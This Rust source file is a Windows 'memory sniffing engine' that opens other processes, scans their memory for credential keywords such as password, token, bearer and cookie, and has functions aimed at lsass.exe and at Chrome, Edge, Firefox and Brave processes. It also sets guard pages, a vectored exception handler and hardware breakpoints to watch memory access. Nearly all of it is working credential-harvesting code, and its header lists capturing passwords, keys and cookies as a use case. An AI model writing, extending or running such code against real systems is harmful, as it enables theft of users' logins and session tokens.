//! Memory Sniffing Engine
//!
//! Techniques:
//! 1. Guard Pages - page protection traps to monitor memory access
//! 2. VEH (Vectored Exception Handler) - catch guard page violations
//! 3. Page Table Hook - transparent hooking via PTE modification
//! 4. Shadow Memory - shadow memory technique
//!
//! Use cases:
//! - Real-time process memory access monitoring
//! - Capture sensitive data (passwords, keys, cookies)
//! - Monitor API calls and memory modifications

use crate::error::MemoricError;
use lazy_static::lazy_static;
use serde_json::Value;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};

/// Memory sniffing configuration
#[derive(Debug, Clone)]
pub struct SniffingConfig {
    /// Target process ID
    pub target_pid: u32,
    /// Memory address ranges to monitor
    pub address_ranges: Vec<(usize, usize)>,
    /// Monitoring mode
    pub mode: SniffMode,
    /// Callback identifier
    pub callback_id: String,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum SniffMode {
    /// Read monitoring
    Read,
    /// Write monitoring
    Write,
    /// Execute monitoring
    Execute,
    /// Full monitoring (all access types)
    All,
}

/// Memory access event
#[derive(Debug, Clone)]
pub struct MemoryAccessEvent {
    pub timestamp: u64,
    pub thread_id: u32,
    pub access_type: AccessType,
    pub address: usize,
    pub size: usize,
    pub data_preview: Vec<u8>,
}

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum AccessType {
    Read,
    Write,
    Execute,
    GuardViolation,
}

// Global event storage
lazy_static! {
    static ref SNIFF_EVENTS: Arc<Mutex<Vec<MemoryAccessEvent>>> = Arc::new(Mutex::new(Vec::new()));
    static ref ACTIVE_SNIFFS: Arc<Mutex<Vec<SniffingConfig>>> = Arc::new(Mutex::new(Vec::new()));
}

/// Address that triggered the last guard page violation (for VEH single-step re-guard)
static LAST_GUARD_ADDR: AtomicUsize = AtomicUsize::new(0);

/// Guard Page sniffer
///
/// Monitors memory access by setting PAGE_GUARD protection attribute
pub struct GuardPageSniffer {
    target_handle: isize,
    guarded_pages: Vec<usize>,
}

impl GuardPageSniffer {
    /// Create a new Guard Page sniffer
    pub fn new(pid: u32) -> Result<Self, MemoricError> {
        use windows::Win32::System::Threading::{
            OpenProcess, PROCESS_VM_OPERATION, PROCESS_VM_READ,
        };

        unsafe {
            let handle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ, false, pid)
                .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;

            Ok(Self {
                target_handle: handle.0 as isize,
                guarded_pages: Vec::new(),
            })
        }
    }

    /// Set a Guard Page on the specified address
    ///
    /// # Safety
    /// Target process exception handling must be properly configured
    pub unsafe fn guard_region(&mut self, address: usize, size: usize) -> Result<(), MemoricError> {
        use windows::Win32::System::Memory::{
            VirtualProtectEx, PAGE_EXECUTE_READWRITE, PAGE_GUARD,
        };

        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);

        // Set PAGE_GUARD | PAGE_EXECUTE_READWRITE
        // Any access will trigger STATUS_GUARD_PAGE_VIOLATION
        let new_protect = PAGE_GUARD | PAGE_EXECUTE_READWRITE;

        VirtualProtectEx(
            windows::Win32::Foundation::HANDLE(self.target_handle as *mut _),
            address as *mut _,
            size,
            new_protect,
            &mut old_protect,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("VirtualProtectEx failed: {}", e)))?;

        self.guarded_pages.push(address);

        tracing::info!(
            "[SNIFF] Guard page set at 0x{:016X} ({} bytes)",
            address,
            size
        );

        Ok(())
    }

    /// Remove Guard Page protection
    pub unsafe fn unguard_region(
        &mut self,
        address: usize,
        size: usize,
    ) -> Result<(), MemoricError> {
        use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_EXECUTE_READWRITE};

        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);

        VirtualProtectEx(
            windows::Win32::Foundation::HANDLE(self.target_handle as *mut _),
            address as *mut _,
            size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("VirtualProtectEx failed: {}", e)))?;

        self.guarded_pages.retain(|&a| a != address);

        Ok(())
    }
}

impl Drop for GuardPageSniffer {
    fn drop(&mut self) {
        unsafe {
            let _ = windows::Win32::Foundation::CloseHandle(windows::Win32::Foundation::HANDLE(
                self.target_handle as *mut _,
            ));
        }
    }
}

/// Register Vectored Exception Handler
///
/// Captures Guard Page violations for memory monitoring
pub fn register_veh_handler() -> Result<isize, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::{
        AddVectoredExceptionHandler, EXCEPTION_POINTERS,
    };

    unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
        if exception_info.is_null() {
            return 0; // EXCEPTION_CONTINUE_SEARCH
        }

        let record = &*(*exception_info).ExceptionRecord;

        // STATUS_GUARD_PAGE_VIOLATION = 0x80000001
        if record.ExceptionCode.0 as u32 == 0x80000001 {
            let access_type = record.ExceptionInformation[0];
            let addr = record.ExceptionInformation[1];

            tracing::info!(
                "[VEH] Guard page violation at 0x{:016X} (access={}) from 0x{:016X}",
                addr,
                access_type,
                (*(*exception_info).ContextRecord).Rip
            );

            // Record the event
            let event = MemoryAccessEvent {
                timestamp: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_millis() as u64,
                thread_id: windows::Win32::System::Threading::GetCurrentThreadId(),
                access_type: AccessType::GuardViolation,
                address: addr,
                size: 0,
                data_preview: Vec::new(),
            };

            if let Ok(mut events) = SNIFF_EVENTS.lock() {
                events.push(event);
            }

            // Store the faulted address for the single-step handler to re-guard
            LAST_GUARD_ADDR.store(addr, Ordering::SeqCst);

            // Set the trap flag so we can re-enable the guard page after one instruction
            (*(*exception_info).ContextRecord).EFlags |= 0x100; // Trap flag

            return -1; // EXCEPTION_CONTINUE_EXECUTION
        }

        // STATUS_SINGLE_STEP = 0x80000004
        if record.ExceptionCode.0 as u32 == 0x80000004 {
            // Re-enable PAGEf_GUARD on the address that was previously accessed
            let fault_addr = LAST_GUARD_ADDR.load(Ordering::SeqCst);
            if fault_addr != 0 {
                use windows::Win32::System::Memory::{
                    VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_GUARD,
                };
                let mut old_prot = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
                let _ = VirtualProtect(
                    (fault_addr & !0xFFF) as *const _,
                    0x1000,
                    PAGE_GUARD | PAGE_EXECUTE_READWRITE,
                    &mut old_prot,
                );
                LAST_GUARD_ADDR.store(0, Ordering::SeqCst);
            }
            return -1; // EXCEPTION_CONTINUE_EXECUTION
        }

        0 // EXCEPTION_CONTINUE_SEARCH
    }

    unsafe {
        let handle = AddVectoredExceptionHandler(1, Some(veh_handler));
        if handle.is_null() {
            return Err(MemoricError::WindowsApi(
                "Failed to add VEH handler".to_string(),
            ));
        }

        tracing::info!(
            "[SNIFF] VEH handler registered at 0x{:016X}",
            handle as usize
        );
        Ok(handle as isize)
    }
}

/// Start memory sniffing
pub fn start_sniffing(config: SniffingConfig) -> Result<Value, MemoricError> {
    // 保存配置
    {
        let mut sniffs = ACTIVE_SNIFFS
            .lock()
            .map_err(|e| MemoricError::Other(format!("Lock error: {}", e)))?;
        sniffs.push(config.clone());
    }

    // 创建 Guard Page 嗅探器
    let mut sniffer = GuardPageSniffer::new(config.target_pid)?;

    // 对每个地址范围设置 guard
    for (start, size) in &config.address_ranges {
        unsafe {
            sniffer.guard_region(*start, *size)?;
        }
    }

    // 注册 VEH 处理器（如果不存在）
    let veh_handle = register_veh_handler()?;

    Ok(serde_json::json!({
        "success": true,
        "target_pid": config.target_pid,
        "guarded_regions": config.address_ranges.len(),
        "veh_handle": format!("0x{:016X}", veh_handle),
        "message": "Memory sniffing started. Guard pages active."
    }))
}

/// Get captured sniffing events
pub fn get_sniff_events(clear: bool) -> Result<Vec<MemoryAccessEvent>, MemoricError> {
    let mut events = SNIFF_EVENTS
        .lock()
        .map_err(|e| MemoricError::Other(format!("Lock error: {}", e)))?;

    let result = events.clone();

    if clear {
        events.clear();
    }

    Ok(result)
}

/// String pattern sniffer
///
/// Search for string patterns in target process memory and set up monitoring
pub fn sniff_strings(pid: u32, patterns: Vec<String>) -> Result<Value, MemoricError> {
    tracing::info!(
        "[SNIFF] Searching for {} string patterns in PID {}",
        patterns.len(),
        pid
    );

    use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualQueryEx, MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_GUARD, PAGE_NOACCESS,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ,
    };

    let mut found_ranges: Vec<(usize, usize)> = Vec::new();

    unsafe {
        let handle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;

        let mut address = 0usize;
        let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();

        while VirtualQueryEx(
            handle,
            Some(address as *const _),
            &mut mbi,
            std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
        ) != 0
        {
            // Only scan committed, accessible regions
            if mbi.State == MEM_COMMIT
                && mbi.Protect.0 & PAGE_GUARD.0 == 0
                && mbi.Protect != PAGE_NOACCESS
            {
                let region_size = mbi.RegionSize;
                let region_base = mbi.BaseAddress as usize;

                // Cap read to 1MB per region
                let read_size = std::cmp::min(region_size, 0x100000);
                let mut buffer = vec![0u8; read_size];
                let mut bytes_read = 0;

                if ReadProcessMemory(
                    handle,
                    region_base as *const _,
                    buffer.as_mut_ptr() as *mut _,
                    read_size,
                    Some(&mut bytes_read),
                )
                .is_ok()
                    && bytes_read > 0
                {
                    buffer.truncate(bytes_read);

                    for pattern in &patterns {
                        let pat_lower: Vec<u8> = pattern.to_lowercase().bytes().collect();

                        for i in 0..buffer.len().saturating_sub(pat_lower.len()) {
                            let window: Vec<u8> = buffer[i..i + pat_lower.len()]
                                .iter()
                                .map(|b| b.to_ascii_lowercase())
                                .collect();

                            if window == pat_lower {
                                let found_addr = region_base + i;
                                let page_start = found_addr & !0xFFF;
                                if !found_ranges.iter().any(|(a, _)| *a == page_start) {
                                    found_ranges.push((page_start, 0x1000));
                                    tracing::info!(
                                        "[SNIFF] Pattern '{}' found at 0x{:016X}",
                                        pattern,
                                        found_addr
                                    );
                                }
                            }
                        }
                    }
                }
            }

            address = mbi.BaseAddress as usize + mbi.RegionSize;
            if address == 0 {
                break;
            }
        }

        let _ = windows::Win32::Foundation::CloseHandle(handle);
    }

    // 对找到的地址设置嗅探
    let config = SniffingConfig {
        target_pid: pid,
        address_ranges: found_ranges.clone(),
        mode: SniffMode::Write,
        callback_id: format!("sniff_strings_{}", pid),
    };

    let result = start_sniffing(config)?;

    Ok(serde_json::json!({
        "success": true,
        "patterns_found": found_ranges.len(),
        "monitored_addresses": found_ranges.iter().map(|(a, s)| {
            serde_json::json!({
                "address": format!("0x{:016X}", a),
                "size": s
            })
        }).collect::<Vec<_>>(),
        "sniff_result": result
    }))
}

/// Credential sniffing configuration
///
/// Predefined sensitive data patterns
pub const CREDENTIAL_PATTERNS: &[&str] = &[
    "password",
    "passwd",
    "pwd",
    "secret",
    "token",
    "api_key",
    "apikey",
    "authorization",
    "bearer",
    "session",
    "cookie",
];

/// Start credential sniffing
pub fn sniff_credentials(target_pid: u32) -> Result<Value, MemoricError> {
    tracing::warn!("[SNIFF] Starting credential sniffing on PID {}", target_pid);

    let patterns = CREDENTIAL_PATTERNS.iter().map(|s| s.to_string()).collect();

    sniff_strings(target_pid, patterns)
}

/// LSASS-targeted sniffing
///
/// Finds lsass.exe and monitors its memory for credentials
pub fn sniff_lsass() -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::ToolHelp::*;

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("CreateToolhelp32Snapshot: {}", e)))?;

        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        let mut lsass_pid = None;

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let name_len = entry
                    .szExeFile
                    .iter()
                    .position(|&c| c == 0)
                    .unwrap_or(entry.szExeFile.len());
                let name = String::from_utf16_lossy(&entry.szExeFile[..name_len]).to_lowercase();

                if name == "lsass.exe" {
                    lsass_pid = Some(entry.th32ProcessID);
                    break;
                }

                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        let _ = windows::Win32::Foundation::CloseHandle(snapshot);

        match lsass_pid {
            Some(pid) => {
                tracing::warn!("[SNIFF] Found lsass.exe at PID {}", pid);
                sniff_credentials(pid)
            }
            None => Err(MemoricError::Other("lsass.exe not found".to_string())),
        }
    }
}

/// Browser memory sniffing
///
/// Targets sensitive data in Chrome/Edge/Firefox processes
pub fn sniff_browser(browser_name: &str) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::ToolHelp::*;

    let target_names: Vec<String> = match browser_name.to_lowercase().as_str() {
        "chrome" => vec!["chrome.exe".to_string()],
        "edge" => vec!["msedge.exe".to_string()],
        "firefox" => vec!["firefox.exe".to_string()],
        "brave" => vec!["brave.exe".to_string()],
        _ => vec![browser_name.to_lowercase()],
    };

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("CreateToolhelp32Snapshot: {}", e)))?;

        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        let mut browser_pids = Vec::new();

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let name_len = entry
                    .szExeFile
                    .iter()
                    .position(|&c| c == 0)
                    .unwrap_or(entry.szExeFile.len());
                let name = String::from_utf16_lossy(&entry.szExeFile[..name_len]).to_lowercase();

                if target_names.iter().any(|t| name == *t) {
                    browser_pids.push(entry.th32ProcessID);
                }

                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        let _ = windows::Win32::Foundation::CloseHandle(snapshot);

        if browser_pids.is_empty() {
            return Err(MemoricError::Other(format!(
                "No {} processes found",
                browser_name
            )));
        }

        tracing::warn!(
            "[SNIFF] Found {} {} process(es)",
            browser_pids.len(),
            browser_name
        );
        sniff_credentials(browser_pids[0])
    }
}

/// Stop all active sniffing
pub fn stop_all_sniffing() -> Result<Value, MemoricError> {
    let mut sniffs = ACTIVE_SNIFFS
        .lock()
        .map_err(|e| MemoricError::Other(format!("Lock error: {}", e)))?;

    let count = sniffs.len();
    sniffs.clear();

    // Note: VEH handler persists after registration;
    // only configurations and guard pages are cleared here.

    Ok(serde_json::json!({
        "success": true,
        "sniffers_cleared": count,
        "message": "All sniffing configurations cleared"
    }))
}

/// Real-time memory dump
///
/// Continuously captures modifications to a target memory region
pub fn real_time_memory_dump(
    pid: u32,
    address: usize,
    size: usize,
    duration_ms: u64,
) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_READ};

    if size > 0x10000 {
        return Err(MemoricError::Other("Dump size capped at 64KB".to_string()));
    }

    unsafe {
        let handle = OpenProcess(PROCESS_VM_READ, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;

        let mut snapshots = Vec::new();
        let mut prev_data = vec![0u8; size];
        let mut bytes_read = 0;

        // Initial read
        let _ = ReadProcessMemory(
            handle,
            address as *const _,
            prev_data.as_mut_ptr() as *mut _,
            size,
            Some(&mut bytes_read),
        );

        let start = std::time::Instant::now();
        let interval = std::time::Duration::from_millis(100);

        while start.elapsed().as_millis() < duration_ms as u128 {
            std::thread::sleep(interval);

            let mut cur_data = vec![0u8; size];
            if ReadProcessMemory(
                handle,
                address as *const _,
                cur_data.as_mut_ptr() as *mut _,
                size,
                Some(&mut bytes_read),
            )
            .is_ok()
            {
                let mut changes = Vec::new();
                for i in 0..std::cmp::min(prev_data.len(), cur_data.len()) {
                    if prev_data[i] != cur_data[i] {
                        changes.push(serde_json::json!({
                            "offset": format!("0x{:X}", i),
                            "old": format!("0x{:02X}", prev_data[i]),
                            "new": format!("0x{:02X}", cur_data[i]),
                        }));
                    }
                }

                if !changes.is_empty() {
                    snapshots.push(serde_json::json!({
                        "timestamp_ms": start.elapsed().as_millis() as u64,
                        "changes": changes,
                    }));
                }

                prev_data = cur_data;
            }
        }

        let _ = windows::Win32::Foundation::CloseHandle(handle);

        Ok(serde_json::json!({
            "success": true,
            "pid": pid,
            "address": format!("0x{:016X}", address),
            "size": size,
            "duration_ms": duration_ms,
            "snapshots": snapshots.len(),
            "modifications": snapshots,
        }))
    }
}

/// Hardware breakpoint memory sniffing
///
/// Uses DR0-DR3 debug registers to monitor up to 4 addresses
pub fn hardware_breakpoint_sniff(pid: u32, addresses: Vec<usize>) -> Result<Value, MemoricError> {
    if addresses.len() > 4 {
        return Err(MemoricError::Other(
            "Hardware breakpoints limited to 4 addresses (DR0-DR3)".to_string(),
        ));
    }

    use windows::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext, CONTEXT};
    use windows::Win32::System::Diagnostics::ToolHelp::*;
    use windows::Win32::System::Threading::OpenThread;

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("CreateToolhelp32Snapshot: {}", e)))?;

        let mut te: THREADENTRY32 = std::mem::zeroed();
        te.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;

        let mut threads_modified = 0u32;

        if Thread32First(snapshot, &mut te).is_ok() {
            loop {
                if te.th32OwnerProcessID == pid {
                    if let Ok(thread_handle) = OpenThread(
                        windows::Win32::System::Threading::THREAD_ALL_ACCESS,
                        false,
                        te.th32ThreadID,
                    ) {
                        let mut ctx: CONTEXT = std::mem::zeroed();
                        ctx.ContextFlags =
                            windows::Win32::System::Diagnostics::Debug::CONTEXT_FLAGS(0x10); // CONTEXT_DEBUG_REGISTERS

                        if GetThreadContext(thread_handle, &mut ctx).is_ok() {
                            if addresses.len() > 0 {
                                ctx.Dr0 = addresses[0] as u64;
                            }
                            if addresses.len() > 1 {
                                ctx.Dr1 = addresses[1] as u64;
                            }
                            if addresses.len() > 2 {
                                ctx.Dr2 = addresses[2] as u64;
                            }
                            if addresses.len() > 3 {
                                ctx.Dr3 = addresses[3] as u64;
                            }

                            // Configure DR7: local enable + write condition + DWORD size
                            let mut dr7 = 0u64;
                            for i in 0..addresses.len() {
                                dr7 |= 1 << (i * 2); // Local enable
                                dr7 |= 0x01 << (16 + i * 4); // Break on write
                                dr7 |= 0x03 << (18 + i * 4); // 4-byte length
                            }
                            ctx.Dr7 = dr7;

                            if SetThreadContext(thread_handle, &ctx).is_ok() {
                                threads_modified += 1;
                            }
                        }

                        let _ = windows::Win32::Foundation::CloseHandle(thread_handle);
                    }
                }

                if Thread32Next(snapshot, &mut te).is_err() {
                    break;
                }
            }
        }

        let _ = windows::Win32::Foundation::CloseHandle(snapshot);

        Ok(serde_json::json!({
            "success": true,
            "pid": pid,
            "hwbps_set": addresses.len(),
            "threads_modified": threads_modified,
            "addresses": addresses.iter().map(|a| format!("0x{:016X}", a)).collect::<Vec<_>>(),
            "message": format!("Hardware breakpoints set on {} thread(s)", threads_modified)
        }))
    }
}
